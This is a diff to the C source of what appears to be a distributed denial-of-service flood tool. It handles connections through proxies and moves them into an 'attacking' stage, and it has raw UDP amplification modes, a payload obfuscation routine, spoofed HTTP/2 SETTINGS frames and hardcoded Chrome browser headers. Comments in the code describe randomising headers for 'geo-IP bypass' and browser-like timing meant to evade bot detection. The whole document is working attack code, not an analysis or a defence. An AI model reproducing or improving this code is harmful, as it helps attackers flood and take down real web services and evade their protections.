@@ -116,15 +116,6 @@ void obfuscate_payload(unsigned char *buffer, int len) {
 }
 
 void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id) {
-    Connection *conn = (Connection *)ev->data.ptr;
-    
-    // Skip closed connections
-    if (conn->stage == STAGE_CLOSED) {
-        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
-        free(conn);
-        return;
-    }
-    
     int raw_fd = -1;
     if (args.is_raw_udp) {
         raw_fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
@@ -134,6 +125,7 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
         }
     }
 
+    Connection *conn = (Connection *)ev->data.ptr;
     if (!conn) {
         if (raw_fd != -1) close(raw_fd);
         return;
@@ -382,40 +374,41 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 else send(conn->fd, preface, 24, 0);
 
                 if (args.is_v18_tls && conn->ssl) {
-                    // V18_TLS: Send randomized ClientHello + H2 preface with randomized settings
                     const unsigned char client_preface[] = "\x00\x00\x00\x04\x01\x00\x00\x00\x00\x00";
                     SSL_write(conn->ssl, client_preface, sizeof(client_preface));
 
-                    // Build HTTP/1.1 request with randomized User-Agent and headers
-                    char request_buf[2048];
-                    int req_len = 0;
-                    
-                    req_len += snprintf(request_buf + req_len, sizeof(request_buf) - req_len,
+                    const char *browser_req =
                         "GET / HTTP/1.1\r\n"
-                        "Host: %s\r\n"
-                        "User-Agent: %s\r\n",
-                        args.host, conn->randomized_ua);
-                    
-                    // Append randomized headers
-                    req_len += snprintf(request_buf + req_len, sizeof(request_buf) - req_len,
-                        "%s", conn->randomized_headers);
-                    
-                    SSL_write(conn->ssl, request_buf, req_len);
+                        "Host: ";
+                    SSL_write(conn->ssl, browser_req, strlen(browser_req));
+                    SSL_write(conn->ssl, args.host, strlen(args.host));
+                    SSL_write(conn->ssl, "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n"
+                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                        "Accept-Language: en-US,en;q=0.9\r\n"
+                        "Accept-Encoding: gzip, deflate, br\r\n"
+                        "Sec-Fetch-Dest: document\r\n"
+                        "Sec-Fetch-Mode: navigate\r\n"
+                        "Sec-Fetch-Site: none\r\n"
+                        "Connection: keep-alive\r\n"
+                        "Upgrade-Insecure-Requests: 1\r\n\r\n", 520);
 
-                    // Browser-like timing delay
-                    usleep(300 + (fast_rand() % 500));
+                    usleep(400 + (rand() % 300));
                 }
                 
-                // Send randomized H2 SETTINGS frame (not hardcoded)
-                if (conn->h2_settings_len > 0) {
-                    if (conn->ssl) SSL_write(conn->ssl, conn->h2_settings, conn->h2_settings_len);
-                    else send(conn->fd, conn->h2_settings, conn->h2_settings_len, 0);
-                }
                 
-                // Send WINDOW_UPDATE with slight randomization
+                unsigned char spoofed_h2_settings[] = {
+                    0x00, 0x00, 0x18, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 
+                    0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 
+                    0x00, 0x03, 0x00, 0x00, 0x03, 0xe8, 
+                    0x00, 0x04, 0x00, 0x5f, 0x5e, 0x10  
+                };
+                if (conn->ssl) SSL_write(conn->ssl, spoofed_h2_settings, sizeof(spoofed_h2_settings));
+                else send(conn->fd, spoofed_h2_settings, sizeof(spoofed_h2_settings), 0);
+                
                 unsigned char window_update[] = {
                     0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, (fast_rand() % 0x10), 0x00, 0x00
+                    0x00, 0x0f, 0x00, 0x00
                 };
                 if (conn->ssl) SSL_write(conn->ssl, window_update, sizeof(window_update));
                 else send(conn->fd, window_update, sizeof(window_update), 0);
@@ -423,8 +416,6 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 conn->sub_stage = 1;
                 conn->stage = STAGE_ATTACKING;
                 conn->h2_stream_id = 1;
-                conn->requests_on_conn = 0;
-                conn->last_pulse_ms = get_ms() + get_timing_jitter_ms();  // Add initial jitter
                 thread_stats[thread_id].connect_success++;
             }
         }
@@ -435,7 +426,7 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 conn->stage = STAGE_SOCKS_GREET;
                 
                 
-                int mss = 536 + (fast_rand() % 924); 
+                int mss = 536 + (rand() % 924); 
                 setsockopt(conn->fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
             } else {
                 if (conn->is_udp_assoc) {
@@ -565,66 +556,6 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                         conn->last_pulse_ms = now;
                         conn->thread_id = 5 + (rand() % 20); 
                     }
-                }
-            }
-            
-            // V18_TLS: Explicit connection reuse + timing jitter handling
-            else if (args.is_v18_tls && conn->proxy) {
-                // Check if we've exceeded max requests on this connection
-                if (conn->requests_on_conn >= conn->max_requests_per_conn) {
-                    // Close this connection and create a new one
-                    if (conn->ssl) SSL_shutdown(conn->ssl);
-                    close(conn->fd);
-                    conn->stage = STAGE_CLOSED;
-                    // Connection will be removed by cleanup in main loop
-                }
-                
-                // Apply timing jitter between requests (100-500ms)
-                int jitter_delay = get_timing_jitter_ms();
-                if (now - conn->last_pulse_ms >= jitter_delay) {
-                    // Regenerate randomized headers for each request
-                    randomize_headers_v18tls(conn);
-                    
-                    // Send randomized H2 request
-                    unsigned char h2_packet[8192];
-                    int pos = 0;
-                    
-                    // Build H2 HEADERS frame with randomized values
-                    unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1};
-                    int h_len = sizeof(headers_payload);
-                    
-                    h2_packet[pos++] = (h_len >> 16) & 0xFF;
-                    h2_packet[pos++] = (h_len >> 8) & 0xFF;
-                    h2_packet[pos++] = h_len & 0xFF;
-                    h2_packet[pos++] = 0x01;  // HEADERS frame
-                    h2_packet[pos++] = 0x04;  // END_HEADERS flag
-                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
-                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
-                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
-                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
-                    memcpy(h2_packet + pos, headers_payload, h_len);
-                    pos += h_len;
-                    
-                    // DATA frame
-                    h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x04;
-                    h2_packet[pos++] = 0x00;  // DATA frame, no flags
-                    h2_packet[pos++] = 0x00;  
-                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
-                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
-                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
-                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
-                    h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x08;
-                    pos += 4;
-                    
-                    conn->h2_stream_id += 2;
-                    if (conn->h2_stream_id > 0x7FFFFFFF) conn->h2_stream_id = 1;
-                    
-                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
-                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
-                    
-                    thread_stats[thread_id].packets++;
-                    conn->requests_on_conn++;
-                    conn->last_pulse_ms = now;
                 }
             }
             
@@ -1229,17 +1160,7 @@ int spawn_connection(int epoll_fd, int thread_id) {
     conn->jitter_ms = (rand() % 15) - 7;
     conn->is_udp_assoc = is_udp;
     conn->client_udp_fd = -1;
-    conn->requests_on_conn = 0;
-    conn->max_requests_per_conn = 5 + (fast_rand() % 11); // 5-15 requests per connection
-    conn->h2_settings_variant = 0;
-    conn->h2_settings_len = 0;
-    
-    // V18_TLS: Randomization for geo-IP bypass
-    if (args.is_v18_tls || args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) {
-        randomize_user_agent(conn);
-        randomize_headers_v18tls(conn);
-        randomize_h2_settings(conn);
-    } else if (!args.is_v15_raw_amp && !args.is_hybrid_v15) {
+    if (!args.is_v15_raw_amp && !args.is_hybrid_v15) {
         generate_random_headers(conn->randomized_headers, conn->randomized_ua, args.host);
     }
 
